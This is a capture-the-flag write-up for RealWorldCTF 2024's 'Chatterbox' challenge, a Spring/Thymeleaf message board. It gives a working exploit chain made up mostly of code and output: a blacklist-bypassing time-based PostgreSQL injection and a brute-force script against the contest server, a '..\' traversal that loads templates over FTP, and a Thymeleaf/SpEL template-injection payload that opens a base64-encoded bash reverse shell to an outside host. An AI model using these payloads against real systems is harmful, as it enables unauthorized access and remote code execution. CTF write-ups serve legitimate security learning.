# 2024 RealWorldCTF - Chatterbox

We have the following files:
```
$ unzip -l ChatterBox-Attachment-Fix-20240127_782dab8bbebe2f058abb04119eadfe88.zip 
Archive:  ChatterBox-Attachment-Fix-20240127_782dab8bbebe2f058abb04119eadfe88.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
 28969065  2024-01-25 16:47   ChatterBox-0.0.1-SNAPSHOT.jar
      101  2024-01-25 16:17   docker-compose.yml
      581  2024-01-25 17:36   Dockerfile
       15  2024-01-25 17:15   flag
     1458  2024-01-08 14:57   init.sql
    16664  2024-01-08 16:32   readflag
      345  2024-01-27 09:04   start.sh
---------                     -------
 28988229                     7 files
```

Challenge is a web application running inside container with a postgres database. Main functionality of the web app is posting messages on one message board.
The decompilation of the jar file shows simple code with three controllers:
- LoginController
- MessageBoardController
- NotifyController

## 1st stage - application login

Local attachment files have a `init.sql` file showing user credentials being `admin:xxxxxxx`. These credentials do not correspond to user credentials on a remote instance.

Luckily, the `LoginController` is vulnerable to SQL injection:
```java
@RequestMapping({"/login"})
public String doLogin(HttpServletRequest request, Model model, HttpSession session) throws Exception {
  String username = request.getParameter("username");
  String password = request.getParameter("passwd");
  if (username != null && password != null) {
    if (!SQLCheck.checkBlackList(username) || !SQLCheck.checkBlackList(password)) {
      model.addAttribute("status", Integer.valueOf(500));
      model.addAttribute("message", "Ban!");
      return "error";
    } 
    String sql = "SELECT id,passwd FROM message_users WHERE username = '" + username + "'";
    if (SQLCheck.check(sql))
      try {
        List<String> pass = this.jdbcTemplate.query(sql, (RowMapper)new Object(this));
        if (!pass.isEmpty()) {
          String[] info = ((String)pass.get(0)).split("/");
          String dbPassword = info[1];
          if (dbPassword != null && dbPassword.equals(password)) {
            int userId = Integer.parseInt(info[0]);
            session.setAttribute("userId", Integer.valueOf(userId));
            return "redirect:/";
          } 
          model.addAttribute("status", Integer.valueOf(500));
          model.addAttribute("message", "Incorrect Username/Password);
        } else {
          model.addAttribute("status", Integer.valueOf(500));
          model.addAttribute("message", "Incorrect Username/Password);
        } 
        return "error";
      } catch (Exception var10) {
        model.addAttribute("status", Integer.valueOf(500));
        model.addAttribute("message", var10.toString());
        return "error";
      }  
    model.addAttribute("status", Integer.valueOf(500));
    model.addAttribute("message", "check error~");
    return "error";
  } 
  return "login";
}
```

Unfortunately, there are checks for SQL keywords and AST in the code under `com.chatterbox.utils.SQLCheck`:
```java
private static List<String> getBlackList() {
  List<String> black = new ArrayList<>();
  black.add("SELECT");
  black.add("UNION");
  black.add("INSERT");
  black.add("ALTER");
  black.add("SLEEP");
  black.add("DELETE");
  black.add("--");
  black.add(";");
  black.add("#");
  black.add("&");
  black.add("/*");
  black.add("OR");
  black.add("EXEC");
  black.add("CREATE");
  black.add("AND");
  black.add("DROP");
  ...
  black.add("NOREPLICATION");
  black.add("BYPASSRLS");
  black.add("FILE");
  black.add("PG_");
  black.add("IMPORT");
  black.add("EXPORT");
  return black;
}
```

The majority of keywords is covered, but we've managed to obtain SQL injection with use of concatenation and `repeat` function which was not blacklisted:
```
' || '' || repeat('', 2147483647 - ascii('<CHAR>') + ascii(substr(passwd,<POS>,1))) || '
```

Breakdown of working payload:
- `'` closes previous username condition
- `|| '' ` concats empty
- `|| repeat('', 2147483647 - ascii('<CHAR>') + ascii(substr(passwd,<POS>,1))) ` - substitute for `pg_sleep`
  - the `repeat` function will repeat the first parameter `''` that many times as specified in the second parameter
  - the second parameter expects an integer
  - 2147483647 is `max_int` meaning that once `ascii('<CHAR>')` is the same as character positioned on `<POS>` in `ascii(substr(passwd,<POS>,1)`, the repeat will execute 2147483647 times effectively putting postgres in extensive workload increasing delay time
  - if characters are not the same, `repeat` will be instructed to execute 2147483647 + N times which is no longer an integer, making postgres fail with instant response (no delays)
  - final payload results in a detection where long delay means that the guessed char is the one contained in the password and no delay means that it is a failed guess
- `|| '` concats quote to complete the last quote in the original SQL query

During test runs we have observed that password is rotated for each instance, but there is a password convention being followed:
```
WeakPass2794a220-1c1d-11ee-9133-0242ac110007!!
WeakPass2794a220-1c1d-11ee-9133-0242ac110008!!
WeakPass;49104e0-1c1c-11ee-8738-0242ac110007!!

WeakPass<UUID_FORMAT>!!
```

This made our bruteforcing easier by guessing just the characters from a UUID held in between `WeakPass[0-9a-f\-]{34}!!`.

This is the final script:
```python
import requests
import urllib.parse
import sys

loop = True
timeout = 1
password='WeakPass'
zerocount = 5
curr = len(password) + 1
s = '-0123456789abcdef!ghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$()*+,-./:><?@^_{|}~='
candidate = ''

i = 0
while loop:
    while i < len(s):
        k = s[i]
        payload = "' || '' || repeat('', 2147483647 - ascii('{}') + ascii(substr(passwd,{},1))) || '".format(k, curr)
        payload = urllib.parse.quote_plus(payload)

        try:
            res = requests.post('http://47.89.225.36:{}/login'.format(sys.argv[1]), data="username={}&passwd=".format(payload), headers={'content-type': 'application/x-www-form-urlencoded'}, timeout=timeout)
            print('{}, {}, {}, {}\r'.format(password, k, res.elapsed.total_seconds(), res.status_code), end='\r')

        except:
            if candidate != '' and candidate == k:
                candidate=''
                curr += 1
                password += k
                i = 0

                if password[-1*zerocount:] == '-'*zerocount:
                    loop = False
                break

            candidate = k
            break

        i += 1

print()
print(password.rstrip('-'*zerocount)+'!!')
```

Testing the script on remote works as demonstrated:
```
$ nc 47.89.225.36 9999

   ___    _                _       _                                ___
  / __|  | |_     __ _    | |_    | |_     ___      _ _     o O O  | _ )    ___    __ __
 | (__   | ' \   / _` |   |  _|   |  _|   / -_)    | '_|   o       | _ \   / _ \   \ \ /
  \___|  |_||_|  \__,_|   _\__|   _\__|   \___|   _|_|_   TS__[O]  |___/   \___/   /_\__|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| {======|_|"""""|_|"""""|_|"""""|
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'

1. tcp port 8080 will be forwarded to another port
2. Only one instance is allowd for each team at a time
3. Please input your team token now:
<REDACTED>

Now your new port is : 32504
You can visit http://47.89.225.36:32504
Please keep this connection

```

Running script against remote:
```
$ python3 solve.py 32504
WeakPasse8aa63fe-bdbb-11ee-ba10-0242ac11000, 1, 0.404789, 200
WeakPasse8aa63fe-bdbb-11ee-ba10-0242ac110002!!
```

Logging in with discovered password:
```
$ curl 'http://47.89.225.36:32504/login' -d 'username=admin&passwd=WeakPasse8aa63fe-bdbb-11ee-ba10-0242ac110002!!' -i
HTTP/1.1 302 
Set-Cookie: JSESSIONID=0A92DDDE3B63070E58F49366E0B7BFDC; Path=/; HttpOnly
Location: http://47.89.225.36:32504/;jsessionid=0A92DDDE3B63070E58F49366E0B7BFDC
Content-Language: en
Content-Length: 0
Date: Sun, 28 Jan 2024 09:06:29 GMT

```

Successful retrieval of index page with given JSESSIONID:
```
$ curl 'http://47.89.225.36:32504/' -H "Cookie: JSESSIONID=0A92DDDE3B63070E58F49366E0B7BFDC" -i
HTTP/1.1 200 
Content-Type: text/html;charset=UTF-8
Content-Language: en
Transfer-Encoding: chunked
Date: Sun, 28 Jan 2024 09:07:36 GMT

<!DOCTYPE html>
<html>
<head>
  <title>ChatterBox</title>
  <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
<div class="container mt-5">
  <h2>ChatterBox</h2>
  <form action="/post_message" method="post">
    <div class="mb-3">
      <textarea class="form-control" name="content" rows="3" placeholder="Write your message here..."></textarea>
    </div>
    <button type="submit" class="btn btn-primary">submit</button>
  </form>

  <div class="mt-4">
    <h4>Message Board</h4>
    
  </div>

</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>

```

## 2nd stage - vulnerable retrieval of templates

The security hotspot once a user is logged in is the `NotifyController`:
```java
@Controller
public class NotifyController {
  private final ApplicationContext applicationContext;
  
  private String templatePrefix = "file:///non_exists/";
  
  private String templateSuffix = ".html";
  
  @Autowired
  public NotifyController(ApplicationContext applicationContext) {
    this.applicationContext = applicationContext;
  }
  
  @GetMapping({"/notify"})
  public String notify(@RequestParam String fname, HttpSession session) throws IOException {
    Integer userId = (Integer)session.getAttribute("userId");
    if (userId != null && userId.intValue() == 1) {
      if (fname.contains("../"))
        return "error"; 
      InputStream inputStream = this.applicationContext.getResource(this.templatePrefix + this.templatePrefix + fname).getInputStream();
      if (inputStream != null && safeCheck(inputStream)) {
        String result = getTemplateEngine().process(fname, (IContext)new Context());
        return result;
      } 
      return "error";
    } 
    return "redirect:login";
  }
  
  public boolean safeCheck(InputStream stream) {
    try {
      String templateContent = new String(stream.readAllBytes());
      return (!templateContent.contains("<") && !templateContent.contains(">") && !templateContent.contains("org.apache") && !templateContent.contains("org.spring"));
    } catch (IOException var3) {
      return false;
    } 
  }
  
  private SpringTemplateEngine getTemplateEngine() {
    SpringResourceTemplateResolver resolver = new SpringResourceTemplateResolver();
    resolver.setApplicationContext(this.applicationContext);
    resolver.setTemplateMode(TemplateMode.HTML);
    resolver.setCharacterEncoding(StandardCharsets.UTF_8.name());
    resolver.setPrefix(this.templatePrefix);
    resolver.setSuffix(this.templateSuffix);
    SpringTemplateEngine templateEngine = new SpringTemplateEngine();
    templateEngine.setTemplateResolver((ITemplateResolver)resolver);
    return templateEngine;
  }
}
```

Note the safety checks:
```java
if (fname.contains("../"))
  return "error"; 
InputStream inputStream = this.applicationContext.getResource(this.templatePrefix + this.templatePrefix + fname).getInputStream();
if (inputStream != null && safeCheck(inputStream)) {
  String result = getTemplateEngine().process(fname, (IContext)new Context());
  return result;
} 
return "error";
```

The path traversal check is quite weak due to a simple bypass with `..\`. This worked well locally but we were sure that the point wasn't in fetching local files.

The way code worked was by attaching a prefix of `file:///non_exists/` to a template of our choice. As per RFC, you may specify a remote authority for non-local files, e.g. `file://host.example.com/path/to/file`.

When specifying remote paths, the java service will try to fetch the file via FTP:
```
$ curl 'http://172.17.0.2:8080/notify?fname=..%5c..%5c172.17.0.1/payload' -H 'Cookie: JSESSIONID=6FA5A7A9F393356B15FD4201921AD1DD'
{"timestamp":"2024-01-28T14:14:44.298+00:00","status":500,"error":"Internal Server Error","path":"/notify"}
```

The error on the service was:
```
2024-01-28T14:14:44.295Z ERROR 67 --- [nio-8080-exec-9] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception

java.net.ConnectException: Connection refused
	at java.base/sun.nio.ch.Net.pollConnect(Native Method) ~[na:na]
	at java.base/sun.nio.ch.Net.pollConnectNow(Net.java:672) ~[na:na]
	at java.base/sun.nio.ch.NioSocketImpl.timedFinishConnect(NioSocketImpl.java:542) ~[na:na]
	at java.base/sun.nio.ch.NioSocketImpl.connect(NioSocketImpl.java:597) ~[na:na]
	at java.base/java.net.Socket.connect(Socket.java:633) ~[na:na]
	at java.base/sun.net.ftp.impl.FtpClient.doConnect(FtpClient.java:1045) ~[na:na]
...
```

The idea behind the 2nd stage was to feed the service with a template file via FTP server. In order to do this we have created a `payload.html` file on the server and served it with `pyftpdlib`.
```
$ cat payload.html
[[9*9]]
$ sudo python3 -m pyftpdlib  -p 21
[sudo] password for vm: 
[I 2024-01-28 15:17:20] concurrency model: async
[I 2024-01-28 15:17:20] masquerade (NAT) address: None
[I 2024-01-28 15:17:20] passive ports: None
[I 2024-01-28 15:17:20] >>> starting FTP server on 0.0.0.0:21, pid=30954 <<<
^Z
[1]+  Stopped                 sudo python3 -m pyftpdlib -p 21
$ curl 'http://172.17.0.2:8080/notify?fname=..%5c..%5c172.17.0.1/payload' -H 'Cookie: JSESSIONID=6FA5A7A9F393356B15FD4201921AD1DD'
^C
$ fg
sudo python3 -m pyftpdlib -p 21
[I 2024-01-28 15:18:48] 172.17.0.2:42478-[] FTP session opened (connect)
[I 2024-01-28 15:18:48] 172.17.0.2:42478-[anonymous] USER 'anonymous' logged in.
[I 2024-01-28 15:18:48] 172.17.0.2:42478-[anonymous] RETR /home/vm/Downloads/rwctf2024/chatterbox/attachment/payload.html completed=1 bytes=8 seconds=0.004
[I 2024-01-28 15:18:48] 172.17.0.2:42486-[] FTP session opened (connect)
[I 2024-01-28 15:18:48] 172.17.0.2:42486-[anonymous] USER 'anonymous' logged in.
[I 2024-01-28 15:18:48] 172.17.0.2:42486-[anonymous] RETR /home/vm/Downloads/rwctf2024/chatterbox/attachment/payload.html completed=1 bytes=8 seconds=0.001
[I 2024-01-28 15:18:48] 172.17.0.2:42486-[anonymous] FTP session closed (disconnect).
^C[I 2024-01-28 15:18:55] received interrupt signal
[I 2024-01-28 15:18:55] >>> shutting down FTP server, 2 socket(s), pid=30954 <<<
[I 2024-01-28 15:18:55] 172.17.0.2:42478-[anonymous] FTP session closed (disconnect).
```

In service logs we see:
```
2024-01-28T14:18:48.312Z ERROR 67 --- [nio-8080-exec-4] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed: org.thymeleaf.exceptions.TemplateInputException: Error resolving template [81
], template might not exist or might not be accessible by any of the configured Template Resolvers] with root cause

org.thymeleaf.exceptions.TemplateInputException: Error resolving template [81
], template might not exist or might not be accessible by any of the configured Template Resolvers
	at org.thymeleaf.engine.TemplateManager.resolveTemplate(TemplateManager.java:869) ~[thymeleaf-3.1.2.RELEASE.jar!/:3.1.2.RELEASE]
```

The `Error resolving template [81` confirms SSTI.

## 3rd stage - getting the correct payload

At this point, we haven't managed to find the correct payload which would give us a way to obtain a shell. 

This was our working payload changed from one of the participants approach:
```
[[${T(org.thymeleaf.util.ClassLoaderUtils).loadClass('org.apa'+'che.logging.log4j.util.LoaderUtil').newInstanceOf('org.spr'+'ingframework.expression.spel.standard.SpelExpressionParser').parseExpression('T(java.lang.Runtime).getRuntime().exec("bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}")').getValue()}]]
```

Breakdown of the payload:
- load `LoaderUtil` via Thymeleaf's `ClassLoaderUtils`
- use `LoaderUtil` to instantiate our own instance of `SpelExpressionParser`
- provide malicious expression to our own instance of `SpelExpressionParser`
  - execute bash command via `Runtime.getRuntime().exec()`
  - base64 encoded bash command is a bash reverse shell towards 172.17.0.1:4444
- the concatenation of strings was used to bypass checks for `org.spring` and `org.apache`, but we've confirmed that a simple space in between also bypasses those checks

Local execution:
```
$ cat payload.html 
[[${T(org.thymeleaf.util.ClassLoaderUtils).loadClass('org.apa'+'che.logging.log4j.util.LoaderUtil').newInstanceOf('org.spr'+'ingframework.expression.spel.standard.SpelExpressionParser').parseExpression('T(java.lang.Runtime).getRuntime().exec("bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}")').getValue()}]]
$ nc -nvlp 4444
Listening on 0.0.0.0 4444
^Z
[1]+  Stopped                 nc -nvlp 4444
$ sudo python3 -m pyftpdlib -p 21
[I 2024-01-28 15:28:17] concurrency model: async
[I 2024-01-28 15:28:17] masquerade (NAT) address: None
[I 2024-01-28 15:28:17] passive ports: None
[I 2024-01-28 15:28:17] >>> starting FTP server on 0.0.0.0:21, pid=31071 <<<
^Z
[2]+  Stopped                 sudo python3 -m pyftpdlib -p 21
$ curl 'http://172.17.0.2:8080/notify?fname=..%5c..%5c172.17.0.1/payload' -H 'Cookie: JSESSIONID=6FA5A7A9F393356B15FD4201921AD1DD'
^C
$ fg
sudo python3 -m pyftpdlib -p 21
[I 2024-01-28 15:28:25] 172.17.0.2:40046-[] FTP session opened (connect)
[I 2024-01-28 15:28:25] 172.17.0.2:40046-[anonymous] USER 'anonymous' logged in.
[I 2024-01-28 15:28:25] 172.17.0.2:40046-[anonymous] RETR /home/vm/Downloads/rwctf2024/chatterbox/attachment/payload.html completed=1 bytes=359 seconds=0.003
[I 2024-01-28 15:28:25] 172.17.0.2:40050-[] FTP session opened (connect)
[I 2024-01-28 15:28:25] 172.17.0.2:40050-[anonymous] USER 'anonymous' logged in.
[I 2024-01-28 15:28:25] 172.17.0.2:40050-[anonymous] RETR /home/vm/Downloads/rwctf2024/chatterbox/attachment/payload.html completed=1 bytes=359 seconds=0.001
[I 2024-01-28 15:28:25] 172.17.0.2:40050-[anonymous] FTP session closed (disconnect).
^C[I 2024-01-28 15:28:26] received interrupt signal
[I 2024-01-28 15:28:26] >>> shutting down FTP server, 2 socket(s), pid=31071 <<<
[I 2024-01-28 15:28:26] 172.17.0.2:40046-[anonymous] FTP session closed (disconnect).
$ fg
nc -nvlp 4444
Connection received on 172.17.0.2 45698
java@8c5c9254eceb:/$ id
id
uid=1000(java) gid=1000(java) groups=1000(java)
java@8c5c9254eceb:/$ /readflag
/readflag
flag{fake_flag}java@8c5c9254eceb:/$
```
